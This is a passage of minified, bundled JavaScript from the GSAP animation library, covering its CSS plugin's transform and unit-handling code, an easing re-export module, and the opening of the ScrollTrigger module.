              if (t.hasAttribute(e[i])) return t.getAttribute(e[i]);
          },
          Y = function (t) {
            var e;
            try {
              e = t.getBBox();
            } catch (i) {
              e = F.call(t, !0);
            }
            return (
              (e && (e.width || e.height)) ||
                t.getBBox === F ||
                (e = F.call(t, !0)),
              !e || e.width || e.x || e.y
                ? e
                : {
                    x: +W(t, ["x", "cx", "x1"]) || 0,
                    y: +W(t, ["y", "cy", "y1"]) || 0,
                    width: 0,
                    height: 0,
                  }
            );
          },
          N = function (t) {
            return !(
              !t.getCTM ||
              (t.parentNode && !t.ownerSVGElement) ||
              !Y(t)
            );
          },
          H = function (t, e) {
            if (e) {
              var i = t.style;
              e in h && e !== D && (e = j),
                i.removeProperty
                  ? (("ms" !== e.substr(0, 2) && "webkit" !== e.substr(0, 6)) ||
                      (e = "-" + e),
                    i.removeProperty(e.replace(g, "-$1").toLowerCase()))
                  : i.removeAttribute(e);
            }
          },
          X = function (t, e, i, n, r, s) {
            var o = new u.PropTween(t._pt, e, i, 0, 1, s ? k : S);
            return (t._pt = o), (o.b = n), (o.e = r), t._props.push(i), o;
          },
          U = { deg: 1, rad: 1, turn: 1 },
          q = function t(e, i, n, s) {
            var o,
              l,
              c,
              f,
              d = parseFloat(n) || 0,
              p = (n + "").trim().substr((d + "").length) || "px",
              m = a.style,
              g = v.test(i),
              _ = "svg" === e.tagName.toLowerCase(),
              y = (_ ? "client" : "offset") + (g ? "Width" : "Height"),
              b = "px" === s,
              w = "%" === s;
            return s === p || !d || U[s] || U[p]
              ? d
              : ("px" !== p && !b && (d = t(e, i, n, "px")),
                (f = e.getCTM && N(e)),
                (!w && "%" !== p) || (!h[i] && !~i.indexOf("adius"))
                  ? ((m[g ? "width" : "height"] = 100 + (b ? p : s)),
                    (l =
                      ~i.indexOf("adius") || ("em" === s && e.appendChild && !_)
                        ? e
                        : e.parentNode),
                    f && (l = (e.ownerSVGElement || {}).parentNode),
                    (l && l !== r && l.appendChild) || (l = r.body),
                    (c = l._gsap) &&
                    w &&
                    c.width &&
                    g &&
                    c.time === u._ticker.time
                      ? (0, u._round)((d / c.width) * 100)
                      : ((w || "%" === p) && (m.position = B(e, "position")),
                        l === e && (m.position = "static"),
                        l.appendChild(a),
                        (o = a[y]),
                        l.removeChild(a),
                        (m.position = "absolute"),
                        g &&
                          w &&
                          (((c = (0, u._getCache)(l)).time = u._ticker.time),
                          (c.width = l[y])),
                        (0, u._round)(
                          b ? (o * d) / 100 : o && d ? (100 / o) * d : 0
                        )))
                  : ((o = f ? e.getBBox()[g ? "width" : "height"] : e[y]),
                    (0, u._round)(w ? (d / o) * 100 : (d / 100) * o)));
          },
          V = function (t, e, i, n) {
            var r;
            return (
              o || z(),
              e in y &&
                "transform" !== e &&
                ~(e = y[e]).indexOf(",") &&
                (e = e.split(",")[0]),
              h[e] && "transform" !== e
                ? ((r = st(t, n)),
                  (r =
                    "transformOrigin" !== e
                      ? r[e]
                      : r.svg
                      ? r.origin
                      : ot(B(t, D)) + " " + r.zOrigin + "px"))
                : (!(r = t.style[e]) ||
                    "auto" === r ||
                    n ||
                    ~(r + "").indexOf("calc(")) &&
                  (r =
                    ($[e] && $[e](t, e, i)) ||
                    B(t, e) ||
                    (0, u._getProperty)(t, e) ||
                    ("opacity" === e ? 1 : 0)),
              i && !~(r + "").trim().indexOf(" ") ? q(t, e, r, i) + i : r
            );
          },
          G = function (t, e, i, n) {
            if (!i || "none" === i) {
              var r = I(e, t, 1),
                s = r && B(t, r, 1);
              s && s !== i
                ? ((e = r), (i = s))
                : "borderColor" === e && (i = B(t, "borderTopColor"));
            }
            var o,
              a,
              l,
              c,
              h,
              f,
              d,
              p,
              m,
              g,
              v,
              _,
              y = new u.PropTween(
                this._pt,
                t.style,
                e,
                0,
                1,
                u._renderComplexString
              ),
              b = 0,
              w = 0;
            if (
              ((y.b = i),
              (y.e = n),
              (i += ""),
              "auto" == (n += "") &&
                ((t.style[e] = n), (n = B(t, e) || n), (t.style[e] = i)),
              (o = [i, n]),
              (0, u._colorStringFilter)(o),
              (n = o[1]),
              (l = (i = o[0]).match(u._numWithUnitExp) || []),
              (n.match(u._numWithUnitExp) || []).length)
            ) {
              for (; (a = u._numWithUnitExp.exec(n)); )
                (d = a[0]),
                  (m = n.substring(b, a.index)),
                  h
                    ? (h = (h + 1) % 5)
                    : ("rgba(" !== m.substr(-5) && "hsla(" !== m.substr(-5)) ||
                      (h = 1),
                  d !== (f = l[w++] || "") &&
                    ((c = parseFloat(f) || 0),
                    (v = f.substr((c + "").length)),
                    (_ = "=" === d.charAt(1) ? +(d.charAt(0) + "1") : 0) &&
                      (d = d.substr(2)),
                    (p = parseFloat(d)),
                    (g = d.substr((p + "").length)),
                    (b = u._numWithUnitExp.lastIndex - g.length),
                    g ||
                      ((g = g || u._config.units[e] || v),
                      b === n.length && ((n += g), (y.e += g))),
                    v !== g && (c = q(t, e, f, g) || 0),
                    (y._pt = {
                      _next: y._pt,
                      p: m || 1 === w ? m : ",",
                      s: c,
                      c: _ ? _ * p : p - c,
                      m: (h && h < 4) || "zIndex" === e ? Math.round : 0,
                    }));
              y.c = b < n.length ? n.substring(b, n.length) : "";
            } else y.r = "display" === e && "none" === n ? k : S;
            return u._relExp.test(n) && (y.e = 0), (this._pt = y), y;
          },
          K = {
            top: "0%",
            bottom: "100%",
            left: "0%",
            right: "100%",
            center: "50%",
          },
          Q = function (t) {
            var e = t.split(" "),
              i = e[0],
              n = e[1] || "50%";
            return (
              ("top" !== i &&
                "bottom" !== i &&
                "left" !== n &&
                "right" !== n) ||
                ((t = i), (i = n), (n = t)),
              (e[0] = K[i] || i),
              (e[1] = K[n] || n),
              e.join(" ")
            );
          },
          Z = function (t, e) {
            if (e.tween && e.tween._time === e.tween._dur) {
              var i,
                n,
                r,
                s = e.t,
                o = s.style,
                a = e.u,
                l = s._gsap;
              if ("all" === a || !0 === a) (o.cssText = ""), (n = 1);
              else
                for (r = (a = a.split(",")).length; --r > -1; )
                  (i = a[r]),
                    h[i] && ((n = 1), (i = "transformOrigin" === i ? D : j)),
                    H(s, i);
              n &&
                (H(s, j),
                l &&
                  (l.svg && s.removeAttribute("transform"),
                  st(s, 1),
                  (l.uncache = 1)));
            }
          },
          $ = {
            clearProps: function (t, e, i, n, r) {
              if ("isFromStart" !== r.data) {
                var s = (t._pt = new u.PropTween(t._pt, e, i, 0, 0, Z));
                return (
                  (s.u = n), (s.pr = -10), (s.tween = r), t._props.push(i), 1
                );
              }
            },
          },
          J = [1, 0, 0, 1, 0, 0],
          tt = {},
          et = function (t) {
            return "matrix(1, 0, 0, 1, 0, 0)" === t || "none" === t || !t;
          },
          it = function (t) {
            var e = B(t, j);
            return et(e) ? J : e.substr(7).match(u._numExp).map(u._round);
          },
          nt = function (t, e) {
            var i,
              n,
              r,
              o,
              a = t._gsap || (0, u._getCache)(t),
              l = t.style,
              c = it(t);
            return a.svg && t.getAttribute("transform")
              ? "1,0,0,1,0,0" ===
                (c = [
                  (r = t.transform.baseVal.consolidate().matrix).a,
                  r.b,
                  r.c,
                  r.d,
                  r.e,
                  r.f,
                ]).join(",")
                ? J
                : c
              : (c !== J ||
                  t.offsetParent ||
                  t === s ||
                  a.svg ||
                  ((r = l.display),
                  (l.display = "block"),
                  ((i = t.parentNode) && t.offsetParent) ||
                    ((o = 1), (n = t.nextSibling), s.appendChild(t)),
                  (c = it(t)),
                  r ? (l.display = r) : H(t, "display"),
                  o &&
                    (n
                      ? i.insertBefore(t, n)
                      : i
                      ? i.appendChild(t)
                      : s.removeChild(t))),
                e && c.length > 6 ? [c[0], c[1], c[4], c[5], c[12], c[13]] : c);
          },
          rt = function (t, e, i, n, r, s) {
            var o,
              a,
              l,
              c = t._gsap,
              u = r || nt(t, !0),
              h = c.xOrigin || 0,
              f = c.yOrigin || 0,
              d = c.xOffset || 0,
              p = c.yOffset || 0,
              m = u[0],
              g = u[1],
              v = u[2],
              _ = u[3],
              y = u[4],
              b = u[5],
              w = e.split(" "),
              x = parseFloat(w[0]) || 0,
              T = parseFloat(w[1]) || 0;
            i
              ? u !== J &&
                (a = m * _ - g * v) &&
                ((l = x * (-g / a) + T * (m / a) - (m * b - g * y) / a),
                (x = x * (_ / a) + T * (-v / a) + (v * b - _ * y) / a),
                (T = l))
              : ((x =
                  (o = Y(t)).x +
                  (~w[0].indexOf("%") ? (x / 100) * o.width : x)),
                (T =
                  o.y +
                  (~(w[1] || w[0]).indexOf("%") ? (T / 100) * o.height : T))),
              n || (!1 !== n && c.smooth)
                ? ((y = x - h),
                  (b = T - f),
                  (c.xOffset = d + (y * m + b * v) - y),
                  (c.yOffset = p + (y * g + b * _) - b))
                : (c.xOffset = c.yOffset = 0),
              (c.xOrigin = x),
              (c.yOrigin = T),
              (c.smooth = !!n),
              (c.origin = e),
              (c.originIsAbsolute = !!i),
              (t.style[D] = "0px 0px"),
              s &&
                (X(s, c, "xOrigin", h, x),
                X(s, c, "yOrigin", f, T),
                X(s, c, "xOffset", d, c.xOffset),
                X(s, c, "yOffset", p, c.yOffset)),
              t.setAttribute("data-svg-origin", x + " " + T);
          },
          st = function (t, e) {
            var i = t._gsap || new u.GSCache(t);
            if ("x" in i && !e && !i.uncache) return i;
            var n,
              r,
              s,
              o,
              a,
              l,
              h,
              m,
              g,
              v,
              _,
              y,
              b,
              w,
              x,
              T,
              S,
              k,
              O,
              E,
              A,
              P,
              C,
              M,
              L,
              R,
              I,
              z,
              F,
              W,
              Y,
              H,
              X = t.style,
              U = i.scaleX < 0,
              q = B(t, D) || "0";
            return (
              (n = r = s = l = h = m = g = v = _ = 0),
              (o = a = 1),
              (i.svg = !(!t.getCTM || !N(t))),
              (w = nt(t, i.svg)),
              i.svg &&
                ((M =
                  (!i.uncache || "0px 0px" === q) &&
                  !e &&
                  t.getAttribute("data-svg-origin")),
                rt(t, M || q, !!M || i.originIsAbsolute, !1 !== i.smooth, w)),
              (y = i.xOrigin || 0),
              (b = i.yOrigin || 0),
              w !== J &&
                ((k = w[0]),
                (O = w[1]),
                (E = w[2]),
                (A = w[3]),
                (n = P = w[4]),
                (r = C = w[5]),
                6 === w.length
                  ? ((o = Math.sqrt(k * k + O * O)),
                    (a = Math.sqrt(A * A + E * E)),
                    (l = k || O ? p(O, k) * f : 0),
                    (g = E || A ? p(E, A) * f + l : 0) &&
                      (a *= Math.abs(Math.cos(g * d))),
                    i.svg &&
                      ((n -= y - (y * k + b * E)), (r -= b - (y * O + b * A))))
                  : ((H = w[6]),
                    (W = w[7]),
                    (I = w[8]),
                    (z = w[9]),
                    (F = w[10]),
                    (Y = w[11]),
                    (n = w[12]),
                    (r = w[13]),
                    (s = w[14]),
                    (h = (x = p(H, F)) * f),
                    x &&
                      ((M = P * (T = Math.cos(-x)) + I * (S = Math.sin(-x))),
                      (L = C * T + z * S),
                      (R = H * T + F * S),
                      (I = P * -S + I * T),
                      (z = C * -S + z * T),
                      (F = H * -S + F * T),
                      (Y = W * -S + Y * T),
                      (P = M),
                      (C = L),
                      (H = R)),
                    (m = (x = p(-E, F)) * f),
                    x &&
                      ((T = Math.cos(-x)),
                      (Y = A * (S = Math.sin(-x)) + Y * T),
                      (k = M = k * T - I * S),
                      (O = L = O * T - z * S),
                      (E = R = E * T - F * S)),
                    (l = (x = p(O, k)) * f),
                    x &&
                      ((M = k * (T = Math.cos(x)) + O * (S = Math.sin(x))),
                      (L = P * T + C * S),
                      (O = O * T - k * S),
                      (C = C * T - P * S),
                      (k = M),
                      (P = L)),
                    h &&
                      Math.abs(h) + Math.abs(l) > 359.9 &&
                      ((h = l = 0), (m = 180 - m)),
                    (o = (0, u._round)(Math.sqrt(k * k + O * O + E * E))),
                    (a = (0, u._round)(Math.sqrt(C * C + H * H))),
                    (x = p(P, C)),
                    (g = Math.abs(x) > 2e-4 ? x * f : 0),
                    (_ = Y ? 1 / (Y < 0 ? -Y : Y) : 0)),
                i.svg &&
                  ((M = t.getAttribute("transform")),
                  (i.forceCSS =
                    t.setAttribute("transform", "") || !et(B(t, j))),
                  M && t.setAttribute("transform", M))),
              Math.abs(g) > 90 &&
                Math.abs(g) < 270 &&
                (U
                  ? ((o *= -1),
                    (g += l <= 0 ? 180 : -180),
                    (l += l <= 0 ? 180 : -180))
                  : ((a *= -1), (g += g <= 0 ? 180 : -180))),
              (i.x =
                n -
                ((i.xPercent =
                  n &&
                  (i.xPercent ||
                    (Math.round(t.offsetWidth / 2) === Math.round(-n)
                      ? -50
                      : 0)))
                  ? (t.offsetWidth * i.xPercent) / 100
                  : 0) +
                "px"),
              (i.y =
                r -
                ((i.yPercent =
                  r &&
                  (i.yPercent ||
                    (Math.round(t.offsetHeight / 2) === Math.round(-r)
                      ? -50
                      : 0)))
                  ? (t.offsetHeight * i.yPercent) / 100
                  : 0) +
                "px"),
              (i.z = s + "px"),
              (i.scaleX = (0, u._round)(o)),
              (i.scaleY = (0, u._round)(a)),
              (i.rotation = (0, u._round)(l) + "deg"),
              (i.rotationX = (0, u._round)(h) + "deg"),
              (i.rotationY = (0, u._round)(m) + "deg"),
              (i.skewX = g + "deg"),
              (i.skewY = v + "deg"),
              (i.transformPerspective = _ + "px"),
              (i.zOrigin = parseFloat(q.split(" ")[2]) || 0) && (X[D] = ot(q)),
              (i.xOffset = i.yOffset = 0),
              (i.force3D = u._config.force3D),
              (i.renderTransform = i.svg ? dt : c ? ft : lt),
              (i.uncache = 0),
              i
            );
          },
          ot = function (t) {
            return (t = t.split(" "))[0] + " " + t[1];
          },
          at = function (t, e, i) {
            var n = (0, u.getUnit)(e);
            return (
              (0, u._round)(
                parseFloat(e) + parseFloat(q(t, "x", i + "px", n))
              ) + n
            );
          },
          lt = function (t, e) {
            (e.z = "0px"),
              (e.rotationY = e.rotationX = "0deg"),
              (e.force3D = 0),
              ft(t, e);
          },
          ct = "0deg",
          ut = "0px",
          ht = ") ",
          ft = function (t, e) {
            var i = e || this,
              n = i.xPercent,
              r = i.yPercent,
              s = i.x,
              o = i.y,
              a = i.z,
              l = i.rotation,
              c = i.rotationY,
              u = i.rotationX,
              h = i.skewX,
              f = i.skewY,
              p = i.scaleX,
              m = i.scaleY,
              g = i.transformPerspective,
              v = i.force3D,
              _ = i.target,
              y = i.zOrigin,
              b = "",
              w = ("auto" === v && t && 1 !== t) || !0 === v;
            if (y && (u !== ct || c !== ct)) {
              var x,
                T = parseFloat(c) * d,
                S = Math.sin(T),
                k = Math.cos(T);
              (T = parseFloat(u) * d),
                (x = Math.cos(T)),
                (s = at(_, s, S * x * -y)),
                (o = at(_, o, -Math.sin(T) * -y)),
                (a = at(_, a, k * x * -y + y));
            }
            g !== ut && (b += "perspective(" + g + ht),
              (n || r) && (b += "translate(" + n + "%, " + r + "%) "),
              (w || s !== ut || o !== ut || a !== ut) &&
                (b +=
                  a !== ut || w
                    ? "translate3d(" + s + ", " + o + ", " + a + ") "
                    : "translate(" + s + ", " + o + ht),
              l !== ct && (b += "rotate(" + l + ht),
              c !== ct && (b += "rotateY(" + c + ht),
              u !== ct && (b += "rotateX(" + u + ht),
              (h === ct && f === ct) || (b += "skew(" + h + ", " + f + ht),
              (1 === p && 1 === m) || (b += "scale(" + p + ", " + m + ht),
              (_.style[j] = b || "translate(0, 0)");
          },
          dt = function (t, e) {
            var i,
              n,
              r,
              s,
              o,
              a = e || this,
              l = a.xPercent,
              c = a.yPercent,
              h = a.x,
              f = a.y,
              p = a.rotation,
              m = a.skewX,
              g = a.skewY,
              v = a.scaleX,
              _ = a.scaleY,
              y = a.target,
              b = a.xOrigin,
              w = a.yOrigin,
              x = a.xOffset,
              T = a.yOffset,
              S = a.forceCSS,
              k = parseFloat(h),
              O = parseFloat(f);
            (p = parseFloat(p)),
              (m = parseFloat(m)),
              (g = parseFloat(g)) && ((m += g = parseFloat(g)), (p += g)),
              p || m
                ? ((p *= d),
                  (m *= d),
                  (i = Math.cos(p) * v),
                  (n = Math.sin(p) * v),
                  (r = Math.sin(p - m) * -_),
                  (s = Math.cos(p - m) * _),
                  m &&
                    ((g *= d),
                    (o = Math.tan(m - g)),
                    (r *= o = Math.sqrt(1 + o * o)),
                    (s *= o),
                    g &&
                      ((o = Math.tan(g)),
                      (i *= o = Math.sqrt(1 + o * o)),
                      (n *= o))),
                  (i = (0, u._round)(i)),
                  (n = (0, u._round)(n)),
                  (r = (0, u._round)(r)),
                  (s = (0, u._round)(s)))
                : ((i = v), (s = _), (n = r = 0)),
              ((k && !~(h + "").indexOf("px")) ||
                (O && !~(f + "").indexOf("px"))) &&
                ((k = q(y, "x", h, "px")), (O = q(y, "y", f, "px"))),
              (b || w || x || T) &&
                ((k = (0, u._round)(k + b - (b * i + w * r) + x)),
                (O = (0, u._round)(O + w - (b * n + w * s) + T))),
              (l || c) &&
                ((o = y.getBBox()),
                (k = (0, u._round)(k + (l / 100) * o.width)),
                (O = (0, u._round)(O + (c / 100) * o.height))),
              (o =
                "matrix(" +
                i +
                "," +
                n +
                "," +
                r +
                "," +
                s +
                "," +
                k +
                "," +
                O +
                ")"),
              y.setAttribute("transform", o),
              S && (y.style[j] = o);
          },
          pt = function (t, e, i, n, r, s) {
            var o,
              a,
              l = (0, u._isString)(r),
              c = parseFloat(r) * (l && ~r.indexOf("rad") ? f : 1),
              h = s ? c * s : c - n,
              d = n + h + "deg";
            return (
              l &&
                ("short" === (o = r.split("_")[1]) &&
                  (h %= 360) != h % 180 &&
                  (h += h < 0 ? 360 : -360),
                "cw" === o && h < 0
                  ? (h = ((h + 360 * m) % 360) - 360 * ~~(h / 360))
                  : "ccw" === o &&
                    h > 0 &&
                    (h = ((h - 360 * m) % 360) - 360 * ~~(h / 360))),
              (t._pt = a = new u.PropTween(t._pt, e, i, n, h, w)),
              (a.e = d),
              (a.u = "deg"),
              t._props.push(i),
              a
            );
          },
          mt = function (t, e) {
            for (var i in e) t[i] = e[i];
            return t;
          },
          gt = function (t, e, i) {
            var n,
              r,
              s,
              o,
              a,
              l,
              c,
              f = mt({}, i._gsap),
              d = i.style;
            for (r in (f.svg
              ? ((s = i.getAttribute("transform")),
                i.setAttribute("transform", ""),
                (d[j] = e),
                (n = st(i, 1)),
                H(i, j),
                i.setAttribute("transform", s))
              : ((s = getComputedStyle(i)[j]),
                (d[j] = e),
                (n = st(i, 1)),
                (d[j] = s)),
            h))
              (s = f[r]) !== (o = n[r]) &&
                "perspective,force3D,transformOrigin,svgOrigin".indexOf(r) <
                  0 &&
                ((a =
                  (0, u.getUnit)(s) !== (c = (0, u.getUnit)(o))
                    ? q(i, r, s, c)
                    : parseFloat(s)),
                (l = parseFloat(o)),
                (t._pt = new u.PropTween(t._pt, n, r, a, l - a, b)),
                (t._pt.u = c || 0),
                t._props.push(r));
            mt(n, f);
          };
        (i._getBBox = Y),
          (i.checkPrefix = I),
          (i._createElement = L),
          (0, u._forEachName)("padding,margin,Width,Radius", function (t, e) {
            var i = "Top",
              n = "Right",
              r = "Bottom",
              s = "Left",
              o = (e < 3 ? [i, n, r, s] : [i + s, i + n, r + n, r + s]).map(
                function (i) {
                  return e < 2 ? t + i : "border" + i + t;
                }
              );
            $[e > 1 ? "border" + t : t] = function (t, e, i, n, r) {
              var s, a;
              if (arguments.length < 4)
                return (
                  (s = o.map(function (e) {
                    return V(t, e, i);
                  })),
                  5 === (a = s.join(" ")).split(s[0]).length ? s[0] : a
                );
              (s = (n + "").split(" ")),
                (a = {}),
                o.forEach(function (t, e) {
                  return (a[t] = s[e] = s[e] || s[((e - 1) / 2) | 0]);
                }),
                t.init(e, a, r);
            };
          });
        var vt = {
          name: "css",
          register: z,
          targetTest: function (t) {
            return t.style && t.nodeType;
          },
          init: function (t, e, i, n, r) {
            var s,
              a,
              l,
              c,
              f,
              d,
              p,
              m,
              g,
              v,
              w,
              S,
              k,
              O,
              E,
              A = this._props,
              P = t.style,
              C = i.vars.startAt;
            for (p in (o || z(), e))
              if (
                "autoRound" !== p &&
                ((a = e[p]),
                !u._plugins[p] || !(0, u._checkPlugin)(p, e, i, n, t, r))
              )
                if (
                  ((f = typeof a),
                  (d = $[p]),
                  "function" === f && (f = typeof (a = a.call(i, n, t, r))),
                  "string" === f &&
                    ~a.indexOf("random(") &&
                    (a = (0, u._replaceRandom)(a)),
                  d)
                )
                  d(this, t, p, a, i) && (E = 1);
                else if ("--" === p.substr(0, 2))
                  (s = (getComputedStyle(t).getPropertyValue(p) + "").trim()),
                    (a += ""),
                    (u._colorExp.lastIndex = 0),
                    u._colorExp.test(s) ||
                      ((m = (0, u.getUnit)(s)), (g = (0, u.getUnit)(a))),
                    g ? m !== g && (s = q(t, p, s, g) + g) : m && (a += m),
                    this.add(P, "setProperty", s, a, n, r, 0, 0, p),
                    A.push(p);
                else if ("undefined" !== f) {
                  if (
                    (C && p in C
                      ? ((s =
                          "function" == typeof C[p]
                            ? C[p].call(i, n, t, r)
                            : C[p]),
                        p in u._config.units &&
                          !(0, u.getUnit)(s) &&
                          (s += u._config.units[p]),
                        "=" === (s + "").charAt(1) && (s = V(t, p)))
                      : (s = V(t, p)),
                    (c = parseFloat(s)),
                    (v =
                      "string" === f && "=" === a.charAt(1)
                        ? +(a.charAt(0) + "1")
                        : 0) && (a = a.substr(2)),
                    (l = parseFloat(a)),
                    p in y &&
                      ("autoAlpha" === p &&
                        (1 === c &&
                          "hidden" === V(t, "visibility") &&
                          l &&
                          (c = 0),
                        X(
                          this,
                          P,
                          "visibility",
                          c ? "inherit" : "hidden",
                          l ? "inherit" : "hidden",
                          !l
                        )),
                      "scale" !== p &&
                        "transform" !== p &&
                        ~(p = y[p]).indexOf(",") &&
                        (p = p.split(",")[0])),
                    (w = p in h))
                  )
                    if (
                      (S ||
                        (((k = t._gsap).renderTransform && !e.parseTransform) ||
                          st(t, e.parseTransform),
                        (O = !1 !== e.smoothOrigin && k.smooth),
                        ((S = this._pt =
                          new u.PropTween(
                            this._pt,
                            P,
                            j,
                            0,
                            1,
                            k.renderTransform,
                            k,
                            0,
                            -1
                          )).dep = 1)),
                      "scale" === p)
                    )
                      (this._pt = new u.PropTween(
                        this._pt,
                        k,
                        "scaleY",
                        k.scaleY,
                        (v ? v * l : l - k.scaleY) || 0
                      )),
                        A.push("scaleY", p),
                        (p += "X");
                    else {
                      if ("transformOrigin" === p) {
                        (a = Q(a)),
                          k.svg
                            ? rt(t, a, 0, O, 0, this)
                            : ((g = parseFloat(a.split(" ")[2]) || 0) !==
                                k.zOrigin &&
                                X(this, k, "zOrigin", k.zOrigin, g),
                              X(this, P, p, ot(s), ot(a)));
                        continue;
                      }
                      if ("svgOrigin" === p) {
                        rt(t, a, 1, O, 0, this);
                        continue;
                      }
                      if (p in tt) {
                        pt(this, k, p, c, a, v);
                        continue;
                      }
                      if ("smoothOrigin" === p) {
                        X(this, k, "smooth", k.smooth, a);
                        continue;
                      }
                      if ("force3D" === p) {
                        k[p] = a;
                        continue;
                      }
                      if ("transform" === p) {
                        gt(this, a, t);
                        continue;
                      }
                    }
                  else p in P || (p = I(p) || p);
                  if (
                    w ||
                    ((l || 0 === l) && (c || 0 === c) && !_.test(a) && p in P)
                  )
                    l || (l = 0),
                      (m = (s + "").substr((c + "").length)) !==
                        (g =
                          (0, u.getUnit)(a) ||
                          (p in u._config.units ? u._config.units[p] : m)) &&
                        (c = q(t, p, s, g)),
                      (this._pt = new u.PropTween(
                        this._pt,
                        w ? k : P,
                        p,
                        c,
                        v ? v * l : l - c,
                        w ||
                        ("px" !== g && "zIndex" !== p) ||
                        !1 === e.autoRound
                          ? b
                          : T
                      )),
                      (this._pt.u = g || 0),
                      m !== g && ((this._pt.b = s), (this._pt.r = x));
                  else if (p in P) G.call(this, t, p, s, a);
                  else {
                    if (!(p in t)) {
                      (0, u._missingPlugin)(p, a);
                      continue;
                    }
                    this.add(t, p, s || t[p], a, n, r);
                  }
                  A.push(p);
                }
            E && (0, u._sortPropTweensByPriority)(this);
          },
          get: V,
          aliases: y,
          getSetter: function (t, e, i) {
            var n = y[e];
            return (
              n && n.indexOf(",") < 0 && (e = n),
              e in h && e !== D && (t._gsap.x || V(t, "x"))
                ? i && l === i
                  ? "scale" === e
                    ? P
                    : A
                  : (l = i || {}) && ("scale" === e ? C : M)
                : t.style && !(0, u._isUndefined)(t.style[e])
                ? O
                : ~e.indexOf("-")
                ? E
                : (0, u._getSetter)(t, e)
            );
          },
          core: { _removeProperty: H, _getMatrix: nt },
        };
        (i.default = i.CSSPlugin = vt),
          (u.gsap.utils.checkPrefix = I),
          (function (t, e, i, n) {
            var r = (0, u._forEachName)(
              "x,y,z,scale,scaleX,scaleY,xPercent,yPercent," +
                e +
                ",transform,transformOrigin,svgOrigin,force3D,smoothOrigin,transformPerspective",
              function (t) {
                h[t] = 1;
              }
            );
            (0, u._forEachName)(e, function (t) {
              (u._config.units[t] = "deg"), (tt[t] = 1);
            }),
              (y[r[13]] = "x,y,z,scale,scaleX,scaleY,xPercent,yPercent," + e),
              (0, u._forEachName)(
                "0:translateX,1:translateY,2:translateZ,8:rotate,8:rotationZ,8:rotateZ,9:rotateX,10:rotateY",
                function (t) {
                  var e = t.split(":");
                  y[e[1]] = r[e[0]];
                }
              );
          })(0, "rotation,rotationX,rotationY,skewX,skewY"),
          (0, u._forEachName)(
            "x,y,z,top,right,bottom,left,width,height,fontSize,padding,margin,perspective",
            function (t) {
              u._config.units[t] = "px";
            }
          ),
          u.gsap.registerPlugin(vt);
      },
      { "./gsap-core.js": "TNS6" },
    ],
    TpQl: [
      function (t, e, i) {
        "use strict";
        Object.defineProperty(i, "__esModule", { value: !0 }),
          Object.defineProperty(i, "Power0", {
            enumerable: !0,
            get: function () {
              return n.Power0;
            },
          }),
          Object.defineProperty(i, "Power1", {
            enumerable: !0,
            get: function () {
              return n.Power1;
            },
          }),
          Object.defineProperty(i, "Power2", {
            enumerable: !0,
            get: function () {
              return n.Power2;
            },
          }),
          Object.defineProperty(i, "Power3", {
            enumerable: !0,
            get: function () {
              return n.Power3;
            },
          }),
          Object.defineProperty(i, "Power4", {
            enumerable: !0,
            get: function () {
              return n.Power4;
            },
          }),
          Object.defineProperty(i, "Linear", {
            enumerable: !0,
            get: function () {
              return n.Linear;
            },
          }),
          Object.defineProperty(i, "Quad", {
            enumerable: !0,
            get: function () {
              return n.Quad;
            },
          }),
          Object.defineProperty(i, "Cubic", {
            enumerable: !0,
            get: function () {
              return n.Cubic;
            },
          }),
          Object.defineProperty(i, "Quart", {
            enumerable: !0,
            get: function () {
              return n.Quart;
            },
          }),
          Object.defineProperty(i, "Quint", {
            enumerable: !0,
            get: function () {
              return n.Quint;
            },
          }),
          Object.defineProperty(i, "Strong", {
            enumerable: !0,
            get: function () {
              return n.Strong;
            },
          }),
          Object.defineProperty(i, "Elastic", {
            enumerable: !0,
            get: function () {
              return n.Elastic;
            },
          }),
          Object.defineProperty(i, "Back", {
            enumerable: !0,
            get: function () {
              return n.Back;
            },
          }),
          Object.defineProperty(i, "SteppedEase", {
            enumerable: !0,
            get: function () {
              return n.SteppedEase;
            },
          }),
          Object.defineProperty(i, "Bounce", {
            enumerable: !0,
            get: function () {
              return n.Bounce;
            },
          }),
          Object.defineProperty(i, "Sine", {
            enumerable: !0,
            get: function () {
              return n.Sine;
            },
          }),
          Object.defineProperty(i, "Expo", {
            enumerable: !0,
            get: function () {
              return n.Expo;
            },
          }),
          Object.defineProperty(i, "Circ", {
            enumerable: !0,
            get: function () {
              return n.Circ;
            },
          }),
          Object.defineProperty(i, "TweenLite", {
            enumerable: !0,
            get: function () {
              return n.TweenLite;
            },
          }),
          Object.defineProperty(i, "TimelineLite", {
            enumerable: !0,
            get: function () {
              return n.TimelineLite;
            },
          }),
          Object.defineProperty(i, "TimelineMax", {
            enumerable: !0,
            get: function () {
              return n.TimelineMax;
            },
          }),
          Object.defineProperty(i, "CSSPlugin", {
            enumerable: !0,
            get: function () {
              return r.CSSPlugin;
            },
          }),
          (i.TweenMax = i.default = i.gsap = void 0);
        var n = t("./gsap-core.js"),
          r = t("./CSSPlugin.js"),
          s = n.gsap.registerPlugin(r.CSSPlugin) || n.gsap,
          o = s.core.Tween;
        (i.TweenMax = o), (i.default = i.gsap = s);
      },
      { "./gsap-core.js": "TNS6", "./CSSPlugin.js": "bp4Z" },
    ],
    TgBN: [
      function (t, e, i) {
        "use strict";
        Object.defineProperty(i, "__esModule", { value: !0 }),
          (i.default = i.ScrollTrigger = void 0);
        var n,
          r,
          s,
          o,
          a,
          l,
          c,
          u,
          h,
          f,
          d,
          p,
          m,
          g,
          v,
          _,
          y,
          b,
          w,
          x,
          T,
          S,
          k,
          O,
          E,
          A,
          P,
          C = 1,
          M = [],
          j = [],
          D = Date.now,
          L = D(),
          B = 0,
          R = 1,
          I = function (t) {
            return t;
          },
          z = function (t) {
            return Math.round(1e5 * t) / 1e5 || 0;
          },
          F = function () {
            return "undefined" != typeof window;
          },
          W = function () {
            return n || (F() && (n = window.gsap) && n.registerPlugin && n);
          },
          Y = function (t) {
            return !!~c.indexOf(t);
          },
          N = function (t, e) {
            return ~M.indexOf(t) && M[M.indexOf(t) + 1][e];
          },
          H = function (t, e) {
            var i = e.s,
              n = e.sc,
              r = j.indexOf(t),
              s = n === yt.sc ? 1 : 2;
            return (
              !~r && (r = j.push(t) - 1),
              j[r + s] ||
                (j[r + s] =
                  N(t, i) ||
                  (Y(t)
                    ? n
                    : function (e) {
                        return arguments.length ? (t[i] = e) : t[i];
                      }))
            );
          },
          X = function (t) {
            return (
              N(t, "getBoundingClientRect") ||
              (Y(t)
                ? function () {
                    return (
                      (oe.width = s.innerWidth), (oe.height = s.innerHeight), oe
                    );
                  }
                : function () {
                    return xt(t);
                  })
            );
          },
          U = function (t, e) {
            return !e || ~M.indexOf(t)
